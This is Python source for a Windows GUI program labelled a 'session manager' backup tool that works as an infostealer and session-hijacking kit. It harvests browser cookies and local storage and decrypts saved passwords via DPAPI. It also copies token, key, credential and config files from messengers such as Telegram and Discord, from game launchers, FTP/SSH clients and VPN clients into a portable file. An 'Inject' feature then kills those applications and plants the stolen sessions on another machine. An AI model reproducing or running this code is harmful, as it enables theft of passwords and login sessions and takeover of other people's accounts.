import os
import json
import sqlite3
import base64
import shutil
import threading
import time
from datetime import datetime
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import win32crypt
from Crypto.Cipher import AES
import psutil

class SessionManager:
    def __init__(self, root):
        self.root = root
        self.root.title("Synxx Session Manager")
        self.root.geometry("900x700")

        self.app_paths = self.get_all_app_paths()
        
        self.current_backup_data = None
        self.setup_ui()
        
    def get_all_app_paths(self):
        appdata_local = os.path.expanduser("~\\AppData\\Local")
        appdata_roaming = os.path.expanduser("~\\AppData\\Roaming")
        
        paths = {}

        browsers = {
            "Chrome": os.path.join(appdata_local, "Google", "Chrome", "User Data"),
            "Edge": os.path.join(appdata_local, "Microsoft", "Edge", "User Data"),
            "Firefox": os.path.join(appdata_roaming, "Mozilla", "Firefox", "Profiles"),
            "Opera": os.path.join(appdata_roaming, "Opera Software", "Opera Stable"),
            "OperaGX": os.path.join(appdata_roaming, "Opera Software", "Opera GX Stable"),
            "Yandex": os.path.join(appdata_local, "Yandex", "YandexBrowser", "User Data"),
            "Vivaldi": os.path.join(appdata_local, "Vivaldi", "User Data"),
            "Brave": os.path.join(appdata_local, "BraveSoftware", "Brave-Browser", "User Data"),
            "Chromium": os.path.join(appdata_local, "Chromium", "User Data"),
            "Torch": os.path.join(appdata_local, "Torch", "User Data"),
        }

        messengers = {
            "Discord": os.path.join(appdata_roaming, "discord"),
            "Telegram": os.path.join(appdata_roaming, "Telegram Desktop", "tdata"),
            "Slack": os.path.join(appdata_roaming, "Slack"),
            "WhatsApp": os.path.join(appdata_local, "WhatsApp"),
            "Signal": os.path.join(appdata_roaming, "Signal"),
            "Skype": os.path.join(appdata_roaming, "Skype"),
            "Teams": os.path.join(appdata_roaming, "Microsoft", "Teams"),
            "Zoom": os.path.join(appdata_roaming, "Zoom"),
        }

        games = {
            "Steam": os.path.join(appdata_local, "Steam"),
            "EpicGames": os.path.join(appdata_local, "EpicGamesLauncher"),
            "Ubisoft": os.path.join(appdata_local, "Ubisoft Game Launcher"),
            "Battle.net": os.path.join(appdata_local, "Battle.net"),
            "Minecraft": os.path.join(appdata_roaming, ".minecraft"),
            "Rockstar": os.path.join(appdata_local, "Rockstar Games"),
        }
        
        media = {
            "Spotify": os.path.join(appdata_roaming, "Spotify"),
            "OBS Studio": os.path.join(appdata_roaming, "obs-studio"),
            "VLC": os.path.join(appdata_roaming, "vlc"),
            "MPC-HC": os.path.join(appdata_roaming, "MPC-HC"),
            "PotPlayer": os.path.join(appdata_roaming, "PotPlayerMini64"),
        }

        development = {
            "Visual Studio Code": os.path.join(appdata_roaming, "Code"),
            "Sublime Text": os.path.join(appdata_roaming, "Sublime Text"),
            "Notepad++": os.path.join(appdata_roaming, "Notepad++"),
            "FileZilla": os.path.join(appdata_roaming, "FileZilla"),
            "WinSCP": os.path.join(appdata_roaming, "WinSCP"),
            "PuTTY": os.path.join(appdata_roaming, "PuTTY"),
            "Git": os.path.join(appdata_local, "GitHub"),
        }
        
        system = {
            "qBittorrent": os.path.join(appdata_roaming, "qBittorrent"),
            "uTorrent": os.path.join(appdata_roaming, "uTorrent"),
            "7-Zip": os.path.join(appdata_roaming, "7-Zip"),
            "WinRAR": os.path.join(appdata_roaming, "WinRAR"),
            "CCleaner": os.path.join(appdata_local, "CCleaner"),
            "Everything": os.path.join(appdata_local, "Everything"),
        }
        
        vpn = {
            "OpenVPN": os.path.join(appdata_roaming, "OpenVPN"),
            "WireGuard": os.path.join(appdata_roaming, "WireGuard"),
            "ProtonVPN": os.path.join(appdata_local, "ProtonVPN"),
            "NordVPN": os.path.join(appdata_local, "NordVPN"),
        }
        
        paths.update(browsers)
        paths.update(messengers)
        paths.update(games)
        paths.update(media)
        paths.update(development)
        paths.update(system)
        paths.update(vpn)
        
        return paths
    
    def setup_ui(self):
        main_frame = ttk.Frame(self.root, padding="15")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        title_label = ttk.Label(main_frame, text="synxx session manager / v1", font=("Arial", 16, "bold"))
        title_label.grid(row=0, column=0, columnspan=2, pady=(0, 20))
        
        btn_frame = ttk.Frame(main_frame)
        btn_frame.grid(row=1, column=0, columnspan=2, pady=(0, 20), sticky=(tk.W, tk.E))
        
        ttk.Button(btn_frame, text="Backup All Sessions", 
                  command=self.backup_all_sessions).pack(side=tk.LEFT, padx=(0, 10))
        ttk.Button(btn_frame, text="Load Backup File", 
                  command=self.load_backup_file).pack(side=tk.LEFT, padx=(0, 10))
        ttk.Button(btn_frame, text="Clear Logs", 
                  command=self.clear_logs).pack(side=tk.LEFT)
        
        self.progress = ttk.Progressbar(main_frame, mode='indeterminate')
        self.progress.grid(row=2, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(0, 20))
        
        log_frame = ttk.LabelFrame(main_frame, text="Operation Log", padding="8")
        log_frame.grid(row=3, column=0, columnspan=2, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        self.log_text = tk.Text(log_frame, height=15, width=80, font=('Consolas', 9))
        scrollbar = ttk.Scrollbar(log_frame, orient="vertical", command=self.log_text.yview)
        self.log_text.configure(yscrollcommand=scrollbar.set)
        
        self.log_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.status_label = ttk.Label(main_frame, text="Ready")
        self.status_label.grid(row=4, column=0, columnspan=2, pady=(10, 0))
        
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        main_frame.columnconfigure(0, weight=1)
        main_frame.rowconfigure(3, weight=1)
        
    def log_message(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_text.insert(tk.END, f"[{timestamp}] {message}\n")
        self.log_text.see(tk.END)
        self.root.update_idletasks()
        
    def update_status(self, message):
        self.status_label.config(text=message)
        
    def backup_all_sessions(self):
        thread = threading.Thread(target=self._backup_all_sessions_thread)
        thread.daemon = True
        thread.start()
        
    def _backup_all_sessions_thread(self):
        self.progress.start()
        self.update_status("Backing up sessions...")
        try:
            backup_data = {
                "metadata": {
                    "version": "1.0",
                    "created": datetime.now().isoformat(),
                    "system": os.name,
                    "user": os.getlogin()
                },
                "sessions": {}
            }
            
            successful_backups = 0
            total_apps = len(self.app_paths)
            current_app = 0
            
            for app_name, path in self.app_paths.items():
                current_app += 1
                self.update_status(f"Backing up {app_name} ({current_app}/{total_apps})...")
                
                if os.path.exists(path):
                    self.log_message(f"Searching {app_name} data...")
                    app_data = self.extract_app_data(path, app_name)
                    if app_data:
                        backup_data["sessions"][app_name] = {
                            "type": self.get_app_type(app_name),
                            "data": app_data,
                            "files_count": len(app_data),
                            "backup_path": path
                        }
                        successful_backups += 1
                        self.log_message(f"SUCCESS: {app_name}: found {len(app_data)} files")
                    else:
                        self.log_message(f"SKIP: {app_name}: no data found")
                else:
                    self.log_message(f"SKIP: {app_name}: path not found")
            
            if successful_backups > 0:
                filename = f"session_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.sm"
                with open(filename, 'w', encoding='utf-8') as f:
                    json.dump(backup_data, f, indent=2, ensure_ascii=False)
                
                self.log_message(f"BACKUP COMPLETE: Saved to: {filename}")
                self.log_message(f"Total applications backed up: {successful_backups}/{total_apps}")
                self.update_status(f"Backup complete: {successful_backups} applications")
                messagebox.showinfo("Success", f"Backup created: {filename}\n{successful_backups}/{total_apps} applications backed up")
            else:
                self.log_message("FAILED: No data found for backup")
                self.update_status("Backup failed: no data found")
                messagebox.showwarning("Warning", "No data found for backup")
                
        except Exception as e:
            self.log_message(f"ERROR: {str(e)}")
            self.update_status("Backup failed")
            messagebox.showerror("Error", f"Backup error: {str(e)}")
        finally:
            self.progress.stop()
    
    def get_app_type(self, app_name):

        browsers = ["Chrome", "Edge", "Firefox", "Opera", "OperaGX", "Yandex", "Vivaldi", "Brave", "Chromium", "Torch"]
        messengers = ["Discord", "Telegram", "Slack", "WhatsApp", "Signal", "Skype", "Teams", "Zoom"]
        games = ["Steam", "EpicGames", "Ubisoft", "Battle.net", "Minecraft", "Rockstar"]
        media = ["Spotify", "OBS Studio", "VLC", "MPC-HC", "PotPlayer"]
        
        if app_name in browsers:
            return "browser"
        elif app_name in messengers:
            return "messenger"
        elif app_name in games:
            return "game"
        elif app_name in media:
            return "media"
        else:
            return "utility"
    
    def extract_app_data(self, app_path, app_name):

        app_data = {}
        
        try:

            if self.get_app_type(app_name) == "browser":
                browser_data = self.extract_browser_data(app_path, app_name)
                app_data.update(browser_data)
            

            important_files = self.find_important_files(app_path, app_name)
            app_data.update(important_files)
            

            config_files = self.scan_for_config_files(app_path)
            app_data.update(config_files)
            
        except Exception as e:
            self.log_message(f"Error extracting {app_name} data: {str(e)}")
            
        return app_data
    
    def extract_browser_data(self, browser_path, browser_name):

        browser_data = {}
        
        try:
            # Куки
            cookies = self.extract_browser_cookies(browser_path, browser_name)
            if cookies:
                browser_data["cookies"] = cookies
            

            local_storage = self.extract_local_storage(browser_path, browser_name)
            if local_storage:
                browser_data["local_storage"] = local_storage
            

            login_data = self.extract_login_data(browser_path, browser_name)
            if login_data:
                browser_data["logins"] = login_data
                
        except Exception as e:
            self.log_message(f"Error extracting {browser_name} browser data: {str(e)}")
            
        return browser_data
    
    def extract_browser_cookies(self, browser_path, browser_name):
        cookies = []
        
        try:
            if browser_name in ["Chrome", "Edge", "Opera", "OperaGX", "Yandex", "Vivaldi", "Brave", "Chromium", "Torch"]:
                profile_paths = [
                    os.path.join(browser_path, "Default", "Network", "Cookies"),
                    os.path.join(browser_path, "Profile 1", "Network", "Cookies"),
                ]
                
                for cookie_path in profile_paths:
                    if os.path.exists(cookie_path):
                        temp_db = "temp_cookies.db"
                        try:
                            shutil.copy2(cookie_path, temp_db)
                            
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            
                            cursor.execute("SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly FROM cookies")
                            
                            for row in cursor.fetchall():
                                cookie = {
                                    'host': row[0],
                                    'name': row[1],
                                    'value': row[2],
                                    'path': row[3],
                                    'expires': row[4],
                                    'secure': bool(row[5]),
                                    'httponly': bool(row[6])
                                }
                                cookies.append(cookie)
                            
                            conn.close()
                            break
                        except Exception as e:
                            self.log_message(f"Error reading {browser_name} cookies: {str(e)}")
                        finally:
                            if os.path.exists(temp_db):
                                os.remove(temp_db)
                    
            elif browser_name == "Firefox":
                profiles = [d for d in os.listdir(browser_path) if os.path.isdir(os.path.join(browser_path, d)) and '.default' in d]
                for profile in profiles:
                    cookies_db = os.path.join(browser_path, profile, "cookies.sqlite")
                    if os.path.exists(cookies_db):
                        temp_db = "temp_firefox.db"
                        try:
                            shutil.copy2(cookies_db, temp_db)
                            
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            
                            cursor.execute("SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies")
                            
                            for row in cursor.fetchall():
                                cookie = {
                                    'host': row[0],
                                    'name': row[1],
                                    'value': row[2],
                                    'path': row[3],
                                    'expires': row[4],
                                    'secure': bool(row[5]),
                                    'httponly': bool(row[6])
                                }
                                cookies.append(cookie)
                            
                            conn.close()
                        except Exception as e:
                            self.log_message(f"Error reading Firefox cookies: {str(e)}")
                        finally:
                            if os.path.exists(temp_db):
                                os.remove(temp_db)
                        
        except Exception as e:
            self.log_message(f"Error extracting {browser_name} cookies: {str(e)}")
            
        return cookies
    
    def extract_local_storage(self, browser_path, browser_name):
        storage_data = {}
        
        try:
            if browser_name in ["Chrome", "Edge", "Opera", "OperaGX", "Yandex", "Vivaldi", "Brave", "Chromium", "Torch"]:
                storage_paths = [
                    os.path.join(browser_path, "Default", "Local Storage"),
                    os.path.join(browser_path, "Profile 1", "Local Storage"),
                ]
                
                for storage_path in storage_paths:
                    if os.path.exists(storage_path):
                        for file in os.listdir(storage_path):
                            if file.endswith('.ldb'):
                                file_path = os.path.join(storage_path, file)
                                try:
                                    with open(file_path, 'rb') as f:
                                        file_content = f.read()
                                        storage_data[file] = base64.b64encode(file_content).decode('utf-8')
                                except Exception as e:
                                    pass
                                    
        except Exception as e:
            self.log_message(f"Error extracting {browser_name} local storage: {str(e)}")
            
        return storage_data
    
    def extract_login_data(self, browser_path, browser_name):
        login_data = {}
        
        try:
            if browser_name in ["Chrome", "Edge", "Opera", "OperaGX", "Yandex", "Vivaldi", "Brave", "Chromium", "Torch"]:
                login_paths = [
                    os.path.join(browser_path, "Default", "Login Data"),
                    os.path.join(browser_path, "Profile 1", "Login Data"),
                ]
                
                for login_path in login_paths:
                    if os.path.exists(login_path):
                        temp_db = "temp_logins.db"
                        try:
                            shutil.copy2(login_path, temp_db)
                            
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            
                            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                            
                            for row in cursor.fetchall():
                                login = {
                                    'url': row[0],
                                    'username': row[1],
                                    'password': self.decrypt_password(row[2]) if row[2] else ''
                                }
                                login_data[row[0]] = login
                            
                            conn.close()
                        except Exception as e:
                            pass
                        finally:
                            if os.path.exists(temp_db):
                                os.remove(temp_db)
                                
        except Exception as e:
            self.log_message(f"Error extracting {browser_name} login data: {str(e)}")
            
        return login_data
    
    def decrypt_password(self, encrypted_password):
        try:
            if not encrypted_password:
                return ""
            
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode('utf-8')
        except:
            return "[ENCRYPTED]"
    
    def find_important_files(self, app_path, app_name):
        important_files = {}
        file_patterns = {
            'config': ['.ini', '.cfg', '.conf', '.json', '.xml', '.yaml', '.yml'],
            'data': ['.dat', '.db', '.sqlite', '.sqlite3', '.mdb'],
            'session': ['.session', '.token', '.key', '.credential'],
            'log': ['.log', '.txt']
        }
        
        try:
            for root, dirs, files in os.walk(app_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    relative_path = os.path.relpath(file_path, app_path)

                    for file_type, extensions in file_patterns.items():
                        if any(file.endswith(ext) for ext in extensions):
                            try:
                                with open(file_path, 'rb') as f:
                                    file_content = f.read()
                                    important_files[relative_path] = {
                                        'content': base64.b64encode(file_content).decode('utf-8'),
                                        'type': file_type
                                    }
                                break
                            except Exception as e:
                                pass
                                
        except Exception as e:
            self.log_message(f"Error finding important files for {app_name}: {str(e)}")
            
        return important_files
    
    def scan_for_config_files(self, app_path):
        config_files = {}
        
        try:
            known_configs = [
                'settings.json', 'config.json', 'preferences.json', 'config.ini',
                'settings.ini', 'prefs.json', 'user.config', 'app.config',
                'configuration.json', 'options.json', 'secrets.json', 'tokens.json',
                'auth.json', 'login.json', 'account.json', 'profile.json'
            ]
            
            for root, dirs, files in os.walk(app_path):
                for file in files:
                    if file.lower() in [cfg.lower() for cfg in known_configs]:
                        file_path = os.path.join(root, file)
                        relative_path = os.path.relpath(file_path, app_path)
                        try:
                            with open(file_path, 'rb') as f:
                                file_content = f.read()
                                config_files[relative_path] = {
                                    'content': base64.b64encode(file_content).decode('utf-8'),
                                    'type': 'config'
                                }
                        except Exception as e:
                            pass
                            
        except Exception as e:
            pass
            
        return config_files
    
    def load_backup_file(self):
        filename = filedialog.askopenfilename(
            title="Select backup file",
            filetypes=[("Session manager files", "*.sm"), ("All files", "*.*")]
        )
        
        if filename:
            try:
                with open(filename, 'r', encoding='utf-8') as f:
                    self.current_backup_data = json.load(f)
                
                self.show_injection_dialog()
                
            except Exception as e:
                messagebox.showerror("Error", f"Failed to load backup file: {str(e)}")
    
    def show_injection_dialog(self):
        if not self.current_backup_data:
            return
            
        inject_window = tk.Toplevel(self.root)
        inject_window.title("Session Injection")
        inject_window.geometry("320x430")
        inject_window.transient(self.root)
        inject_window.grab_set()
        
        main_frame = ttk.Frame(inject_window, padding="15")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        title_label = ttk.Label(main_frame, text="Available Sessions for Injection", font=("Arial", 12, "bold"))
        title_label.pack(pady=(0, 15))

        notebook = ttk.Notebook(main_frame)
        notebook.pack(fill=tk.BOTH, expand=True)
        
        sessions = self.current_backup_data.get("sessions", {})

        categories = {}
        for app_name, app_data in sessions.items():
            app_type = app_data.get("type", "utility")
            if app_type not in categories:
                categories[app_type] = {}
            categories[app_type][app_name] = app_data
        
        for category, apps in categories.items():
            category_frame = ttk.Frame(notebook)
            notebook.add(category_frame, text=category.capitalize())
            
            canvas = tk.Canvas(category_frame)
            scrollbar = ttk.Scrollbar(category_frame, orient="vertical", command=canvas.yview)
            scrollable_frame = ttk.Frame(canvas)
            
            scrollable_frame.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
            canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
            canvas.configure(yscrollcommand=scrollbar.set)
            
            for app_name, app_data in apps.items():
                app_frame = ttk.Frame(scrollable_frame, relief='solid', borderwidth=1)
                app_frame.pack(fill=tk.X, padx=5, pady=2)
                
                files_count = app_data.get("files_count", 0)
                app_text = f"{app_name} - {files_count} files"
                
                app_label = ttk.Label(app_frame, text=app_text, font=('Segoe UI', 9))
                app_label.pack(side=tk.LEFT, padx=10, pady=6)
                
                inject_btn = ttk.Button(app_frame, text="Inject", 
                                      command=lambda app=app_name: self.inject_single_app(app),
                                      width=8)
                inject_btn.pack(side=tk.RIGHT, padx=10, pady=4)
            
            canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
            scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        button_frame = ttk.Frame(main_frame)
        button_frame.pack(fill=tk.X, pady=(15, 5))
        
        inject_all_btn = ttk.Button(button_frame, text="Inject All", 
                                  command=self.inject_all_apps,
                                  width=15)
        inject_all_btn.pack(pady=5)
        
    def inject_single_app(self, app_name):
        if not self.current_backup_data:
            return
            
        sessions = self.current_backup_data.get("sessions", {})
        app_data = sessions.get(app_name)
        
        if not app_data:
            return
            
        self.close_apps_before_restore([app_name])
        
        thread = threading.Thread(target=self._inject_single_app_thread, args=(app_name, app_data))
        thread.daemon = True
        thread.start()
        
    def _inject_single_app_thread(self, app_name, app_data):
        self.progress.start()
        self.update_status(f"Injecting {app_name}...")
        try:
            success = self.restore_app_data(app_name, app_data.get("data", {}))
            
            if success:
                self.log_message(f"SUCCESS: Injected {app_name}")
                self.update_status(f"Injected {app_name}")
                messagebox.showinfo("Success", f"Successfully injected {app_name}!\nYou can now open the application.")
            else:
                self.log_message(f"FAILED: Could not inject {app_name}")
                self.update_status(f"Failed to inject {app_name}")
                messagebox.showwarning("Warning", f"Failed to inject {app_name}")
                
        except Exception as e:
            self.log_message(f"ERROR: Injection failed for {app_name}: {str(e)}")
            self.update_status(f"Injection failed for {app_name}")
            messagebox.showerror("Error", f"Injection failed for {app_name}: {str(e)}")
        finally:
            self.progress.stop()
    
    def inject_all_apps(self):
        if not self.current_backup_data:
            return
            
        sessions = self.current_backup_data.get("sessions", {})
        
        app_names = list(sessions.keys())
        self.close_apps_before_restore(app_names)
        
        thread = threading.Thread(target=self._inject_all_apps_thread, args=(sessions,))
        thread.daemon = True
        thread.start()
        
    def _inject_all_apps_thread(self, sessions):
        self.progress.start()
        self.update_status("Injecting all applications...")
        try:
            successful_injections = 0
            
            for app_name, app_data in sessions.items():
                success = self.restore_app_data(app_name, app_data.get("data", {}))
                
                if success:
                    successful_injections += 1
                    self.log_message(f"SUCCESS: Injected {app_name}")
                else:
                    self.log_message(f"FAILED: Could not inject {app_name}")
            
            self.log_message(f"INJECTION COMPLETE: Successfully injected {successful_injections}/{len(sessions)} applications")
            self.update_status(f"Injected {successful_injections} applications")
            messagebox.showinfo("Success", f"Injected {successful_injections}/{len(sessions)} applications!\nYou can now open the applications.")
            
        except Exception as e:
            self.log_message(f"ERROR: Bulk injection failed: {str(e)}")
            self.update_status("Bulk injection failed")
            messagebox.showerror("Error", f"Bulk injection error: {str(e)}")
        finally:
            self.progress.stop()
    
    def close_apps_before_restore(self, app_names):
        app_process_map = {
            'Chrome': 'chrome.exe', 'Edge': 'msedge.exe', 'Firefox': 'firefox.exe',
            'Opera': 'opera.exe', 'OperaGX': 'opera.exe', 'Yandex': 'browser.exe',
            'Vivaldi': 'vivaldi.exe', 'Brave': 'brave.exe', 'Discord': 'discord.exe',
            'Telegram': 'telegram.exe', 'Slack': 'slack.exe', 'WhatsApp': 'whatsapp.exe',
            'Signal': 'signal.exe', 'Skype': 'skype.exe', 'Teams': 'teams.exe',
            'Zoom': 'zoom.exe', 'Steam': 'steam.exe', 'Spotify': 'spotify.exe',
            'OBS Studio': 'obs64.exe', 'VLC': 'vlc.exe', 'Code': 'code.exe',
            'qBittorrent': 'qbittorrent.exe', 'uTorrent': 'utorrent.exe',
        }
        
        apps_to_close = []
        for app_name in app_names:
            process_name = app_process_map.get(app_name)
            if process_name:
                apps_to_close.append(process_name)
        
        for proc in psutil.process_iter(['name']):
            try:
                if proc.info['name'].lower() in [app.lower() for app in apps_to_close]:
                    proc.terminate()
                    self.log_message(f"CLOSED: Process: {proc.info['name']}")
                    time.sleep(1)
            except:
                pass
    
    def restore_app_data(self, app_name, app_data):
        try:
            original_path = self.app_paths.get(app_name)
            if not original_path:
                self.log_message(f"Unknown application path for {app_name}")
                return False
            
            if not os.path.exists(original_path):
                os.makedirs(original_path, exist_ok=True)
            
            restored_files = 0
            for relative_path, file_info in app_data.items():
                try:
                    file_path = os.path.join(original_path, relative_path)
                    file_dir = os.path.dirname(file_path)
                    
                    if not os.path.exists(file_dir):
                        os.makedirs(file_dir, exist_ok=True)
                    
                    file_content = base64.b64decode(file_info['content'])
                    
                    with open(file_path, 'wb') as f:
                        f.write(file_content)
                    
                    restored_files += 1
                    self.log_message(f"RESTORED: {app_name} file: {relative_path}")
                    
                except Exception as e:
                    self.log_message(f"ERROR restoring {app_name} file {relative_path}: {str(e)}")
            
            self.log_message(f"SUCCESS: Restored {restored_files} files for {app_name}")
            return restored_files > 0
            
        except Exception as e:
            self.log_message(f"ERROR restoring {app_name}: {str(e)}")
            return False
    
    def clear_logs(self):
        self.log_text.delete(1.0, tk.END)
        self.log_message("Logs cleared")
        self.update_status("Ready")

if __name__ == "__main__":
    try:
        import win32crypt
    except ImportError:
        print("Install dependencies: pip install pywin32 pycryptodome psutil")
        exit()
    
    root = tk.Tk()
    app = SessionManager(root)
    root.mainloop()
